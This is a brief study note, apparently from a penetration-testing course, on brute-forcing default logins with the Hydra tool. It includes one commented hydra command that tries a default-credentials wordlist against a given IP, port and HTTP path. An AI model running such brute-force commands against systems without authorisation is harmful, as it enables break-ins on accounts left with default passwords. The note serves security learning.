#BruteForcing #PasswordCracking 

Default accounts are intended to simplify first access. However, they are not uncommon for user accounts and often go overlooked or forgotten. 

### Hydra
**Hydra** is a tool for *Login Brute Forcing*, it covers a variety of attacks and services and is relatively fast compared to other tools. It tests any pair of credentials and verify whether they are successful or not but in bulk and quickly. 
### Default Passwords
It is common to find pairs of usernames and passwords used together, especially so with default service passwords. 
``` bash
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

# -C ftp-.... combined credentials wordlist
# SERVER_IP   target IP
# -s PORT     target Port
# http-get    request method
# /           target path
```
